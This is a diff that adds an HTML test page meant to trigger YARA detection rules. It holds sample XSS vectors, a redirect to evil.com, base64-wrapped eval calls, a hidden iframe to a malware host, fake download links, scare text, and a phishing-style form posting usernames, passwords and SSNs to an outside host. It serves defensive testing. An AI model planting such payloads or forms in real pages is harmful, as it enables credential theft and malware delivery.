@@ -1,0 +1,48 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Test Malicious Content</title>
+</head>
+<body>
+    <h1>Test Page for YARA Detection</h1>
+
+    <!-- XSS patterns that should trigger YARA rules -->
+    <script>alert('xss')</script>
+    <img src="x" onerror="alert('xss')">
+    <iframe src="javascript:alert('xss')"></iframe>
+    <svg onload="alert('xss')"></svg>
+
+    <!-- Suspicious JavaScript -->
+    <script>document.cookie</script>
+    <script>window.location='http://evil.com'</script>
+    <script>eval(atob('YWxlcnQoInhzcyIp'))</script>
+
+    <!-- Phishing-like form -->
+    <form action="http://suspicious-site.com/collect.php" method="post">
+        <input type="text" name="username" placeholder="Username">
+        <input type="password" name="password" placeholder="Password">
+        <input type="text" name="ssn" placeholder="Social Security Number">
+        <input type="submit" value="Login">
+    </form>
+
+    <!-- Malware download links -->
+    <a href="http://updates.example.com/flash_update.exe">Download Flash Update</a>
+    <a href="http://security-update.net/windows_patch.scr">Security Patch</a>
+
+    <!-- Auto-download iframe -->
+    <iframe src="http://malware.example.com/exploit.html" style="display:none;"></iframe>
+
+    <!-- Base64 encoded suspicious content -->
+    <script>
+        var malicious = atob('ZXZhbChhbGVydCgibWFsd2FyZSIpKQ==');
+        // This decodes to: eval(alert("malware"))
+    </script>
+
+    <!-- Suspicious patterns for detection -->
+    <div style="color: red; font-weight: bold;">
+        WARNING: Your account will be suspended unless you verify immediately!
+    </div>
+
+    <p>This content should trigger multiple YARA rules for testing purposes.</p>
+</body>
+</html>
